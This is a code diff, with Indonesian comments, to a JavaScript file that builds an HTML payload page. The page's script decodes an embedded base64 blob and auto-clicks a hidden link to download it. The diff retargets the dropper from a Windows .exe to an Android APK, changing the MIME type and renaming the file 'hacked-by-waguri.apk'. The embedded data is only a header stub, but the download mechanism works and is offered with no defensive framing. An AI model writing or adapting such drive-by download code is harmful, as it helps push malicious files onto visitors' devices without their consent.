@@ -147,7 +147,8 @@ const payloadText = "<!DOCTYPE html>" +
 "}" +
 "return bytes;" +
 "}" +
-"var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
+// DIUBAH: Payload APK (Header ZIP: PK\x03\x04)
+"var b64Data = \"UEsDBAoAAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
 "var sudah = false;" +
 "function picuDownload(){" +
 "if (sudah) return;" +
@@ -156,11 +157,13 @@ const payloadText = "<!DOCTYPE html>" +
 "try{" +
 "statusEl.textContent = 'Menyiapkan berkas...';" +
 "var bytesArr = b64KeBytes(b64Data);" +
-"var blob = new Blob([bytesArr], { type: 'application/octet-stream' });" +
+// DIUBAH: MIME Type APK
+"var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
 "var url = URL.createObjectURL(blob);" +
 "var a = document.createElement('a');" +
 "a.href = url;" +
-"a.download = 'hacked-by-anonymous.exe';" +
+// DIUBAH: Nama file APK
+"a.download = 'hacked-by-waguri.apk';" +
 "a.style.display = 'none';" +
 "document.body.appendChild(a);" +
 "a.click();" +
